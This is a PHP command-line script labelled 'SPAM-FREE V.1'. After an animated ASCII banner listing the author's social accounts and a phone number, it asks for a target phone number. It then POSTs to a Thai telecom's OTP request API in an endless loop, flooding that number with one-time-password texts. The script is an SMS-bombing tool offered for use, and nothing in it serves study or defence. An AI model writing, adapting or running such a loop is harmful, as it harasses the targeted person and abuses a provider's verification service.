<?php
error_reporting(0);
session_start();
date_default_timezone_set('Asia/Ho_Chi_Minh');
/***[ Color ]***/
$xnhac = "\033[1;36m";
$do = "\033[1;31m";
$luc = "\033[1;32m";
$vang = "\033[1;33m";
$xduong = "\033[1;34m";
$hong = "\033[1;35m";
$trang = "\033[1;37m";
system('clear');
$thanh_xau= $trang."~".$do."[".$luc."●".$do."] ".$trang."=> ";
$thanh_dep= $trang."~".$do."[".$luc."✓".$do."] ".$trang."=> ";
system('clear');

echo $xnhac."\n";
echo "             ";
$t=$trang."\033[1;  ████████╗██████╗░██╗░░░██╗███████╗███╗░░░███╗  ██╗░░██╗";   
for($i=11;$i<(strlen($t)+1);$i++){echo $t[$i];
  usleep(2000);
}

echo $luc."\n";
echo "             ";
$t=$trang."\033[1;  ╚══██╔══╝██╔══██╗██║░░░██║██╔════╝████╗░████║  ██║░░██║";
for($i=11;$i<(strlen($t)+1);$i++){echo $t[$i];
  usleep(2000);
}

echo $vang."\n";
echo "             ";
$t=$trang."\033[1;  ░░░██║░░░██████╔╝██║░░░██║█████╗░░██╔████╔██║  ███████║";
for($i=11;$i<(strlen($t)+1);$i++){echo $t[$i];
  usleep(2000);
}

echo $do."\n";
echo "             ";
$t=$trang."\033[1;  ░░░██║░░░██╔══██╗██║░░░██║██╔══╝░░██║╚██╔╝██║  ██╔══██║";
for($i=11;$i<(strlen($t)+1);$i++){echo $t[$i];
  usleep(2000);
}

echo $hong."\n";
echo "             ";
$t=$trang."\033[1;  ░░░██║░░░██║░░██║╚██████╔╝███████╗██║░╚═╝░██║  ██║░░██║";
for($i=11;$i<(strlen($t)+1);$i++){echo $t[$i];
  usleep(2000);
}

echo $xduong."\n";
echo "             ";
$t=$trang."\033[1;  ░░░╚═╝░░░╚═╝░░╚═╝░╚═════╝░╚══════╝╚═╝░░░░░╚═╝  ╚═╝░░╚═╝";
for($i=11;$i<(strlen($t)+1);$i++){echo $t[$i];
  usleep(2000);
}
echo"
\n";
echo $vang."╔══════════════════════════════════════════════╗\n";
echo $vang."║════════════════════════════════════════════\n";
echo $vang."║".$vang."══".$do.">".$vang."║" .$luc."FACEBOOK:  ".$do."Toey Monifire  \n";
echo $vang."║".$vang."══".$do.">".$vang."║" .$luc."INSTAGRAM: ".$vang."monifire.amv ".$vang."           \n";
echo $vang."║".$vang."══".$do.">".$vang."║" .$luc."NUMBER:    ".$xnhac."0903281894 ".$vang."     \n";
echo $vang."║".$vang."══".$do.">".$vang."║" .$luc."WEBSITE:   ".$hong."https://channel-monifire.netlify.app/".$vang."         \n"; 
echo $vang."║".$vang."══".$do.">".$vang."║" .$luc."YOUTRBE:   ".$trang."MONIFIRE".$vang."     \n";
echo $vang."║".$do."            " .$vang."   \n";
echo $vang."║".$hong."           ".$vang."  \n";
echo $vang."║               SPAM-FREE V.1     \n";
echo $vang."║════════════════════════════════════════════\n";
echo $vang."╚══════════════════════════════════════════════╝\n";
echo"\n";


echo "\033[1;31mAUTO-PHONE : \033[1;34m";
$sdt = trim(fgets(STDIN));
while (true){
  goi($sdt);
}
function goi($sdt){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number=".$sdt);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
  $a = curl_exec($ch);curl_close($ch);
  echo $a;
}

?>
